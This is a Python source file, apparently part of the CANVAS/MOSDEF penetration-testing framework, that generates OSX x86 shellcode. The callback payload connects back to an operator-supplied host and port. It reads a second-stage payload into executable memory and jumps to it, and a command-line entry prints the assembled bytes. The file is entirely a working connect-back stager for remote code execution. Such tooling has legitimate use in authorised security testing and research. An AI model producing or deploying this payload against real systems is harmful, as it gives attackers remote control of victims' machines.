#! /usr/bin/env python
# a payload generator for OSX x86

import sys
import socket
import struct

from basecode import basecode
from basecode import s_to_push
from MOSDEF import mosdef
from exploitutils import *

import canvasengine
import logging


class payloads:
    def __init__(self, module=None):
        self.module = module

    def get_basecode(self, **args):
        return basecode(**args)

    def assemble(self, code):
        """
        just a little convenience callthrough to mosdef.assemble
        """
        return mosdef.assemble(code, 'X86')

    def callback(self, host, port, universal=True, fork_exit=True):
        """
        First stage payload for MOSDEF
        """
        codegen = self.get_basecode()
        codegen.main = ""

        if fork_exit:
            codegen.main += """
            xorl  %eax,  %eax
            pushl %eax

            movl  $0x2,  %eax
            int   $0x80
            addl  $4, %esp

            orl   %edx, %edx
            jz    exit
            """

        codegen.main += """
        // socket()
        xorl    %eax, %eax
        pushl   %eax // protocol
        inc     %eax
        pushl   %eax // type
        inc     %eax
        pushl   %eax // domain
        pushl   %eax // PAD
        movl    $0x61, %eax
        int     $0x80
        jb      exit
        addl    $16, %esp
        movl    %eax, %esi

        //connect(socket, struct sockaddr, 16)
        xorl    %eax, %eax
        xorl    %ebx, %ebx

        //build the sockaddr struct
        pushl   %eax
        pushl   %eax
        pushl   $IPADDRESS
        pushw   $PORT
        .byte 0x66
        .byte 0x6A
        .byte 0x02
        movl    %esp, %edx

        movb    $16, %al
        pushl   %eax
        pushl   %edx
        pushl   %esi
        movb    $3, %bl
        pushl   %ebx
        movl    %esp, %ecx
        movb    $98, %al
        int     $0x80
        test    %eax, %eax
        jnz     exit

        addl    $30, %esp
        movl    %esi, %ebx
        """

        if universal:
            if (self.module and hasattr(self.module, 'engine') == True
                and self.module.engine):
                mosdef_id = self.module.engine.getNewMosdefID(self.module)
            else:
                mosdef_id = 0

            codegen.main += """
            // send type
            movl  $0x08000000, %eax
            pushl %eax
            movl  %esp, %eax

            movl  $4, %ecx
            pushl %ecx
            pushl %eax
            pushl %ebx
            pushl %ebx
            movl  $0x4, %eax
            int   $0x80
            addl  $20, %esp

            // send id
            xorl  %eax, %eax
            movl  $MOSDEF_ID, %eax
            pushl %eax
            movl  %esp, %eax

            movl  $4, %ecx
            pushl %ecx
            pushl %eax
            pushl %ebx
            pushl %ebx
            movl  $0x4, %eax
            int   $0x80
            addl  $20, %esp
            """.replace("MOSDEF_ID", str(socket.htonl(mosdef_id)))

        codegen.main += """
        // read length
        movl    $4,   %ecx
        subl    %ecx, %esp
        movl    %esp, %edi
        movl    %edi, %esi

readloop1:
        pushl   %ecx
        pushl   %edi
        pushl   %ebx
        movl    $3, %eax
        pushl   %eax
        int     $0x80
        jb      exit
        addl    $16, %esp

        subl    %eax, %ecx
        addl    %eax, %edi
        cmp     $0,   %ecx
        jg      readloop1

        movl    (%esi) ,%ecx
        addl    $4, %esp

        // MMAP
        xorl    %eax, %eax
        pushl   %eax
        dec     %eax
        pushl   %eax
        movl    $0x1002, %eax
        pushl   %eax
        movl    $0x7, %eax
        pushl   %eax
        pushl   %ecx
        xorl    %eax, %eax
        pushl   %eax
        pushl   %eax
        movl    $0xc5, %eax
        int     $0x80

        test    %eax, %eax
        jz      exit
        addl    $28, %esp

        // read code
        movl    %eax, %edi
        movl    %edi, %esi

readloop2:
        pushl   %ecx
        pushl   %edi
        pushl   %ebx
        pushl   %ebx
        movl    $3, %eax
        int     $0x80
        jb      exit
        addl    $24, %esp

        subl    %eax, %ecx
        addl    %eax, %edi
        cmp     $0,   %ecx
        jg      readloop2

        // execute
        jmp     *%esi

exit:
        xorl    %eax, %eax
        inc     %eax
        pushl   %eax
        pushl   %eax
        int     $0x80
        """

        codegen.main = codegen.main.replace("IPADDRESS", uint32fmt(istr2int(socket.inet_aton(socket.gethostbyname(host)))))
        codegen.main = codegen.main.replace("PORT", uint16fmt(byteswap_16(port)))

        return codegen.get()


if __name__ == '__main__':
    p = payloads()

    if len(sys.argv) != 3:
        logging.warning('Usage: %s ip port' % (sys.argv[0]))
        sys.exit(1)


    asm = p.callback(sys.argv[1], int(sys.argv[2]))
    bin = p.assemble(asm)

    out   = ''
    count = 0

    for c in bin:
        out += '\\x%.2x' % ord(c)
        count += 1
        if count % 16 == 0:
            out += '\n'
            count = 0

    print out
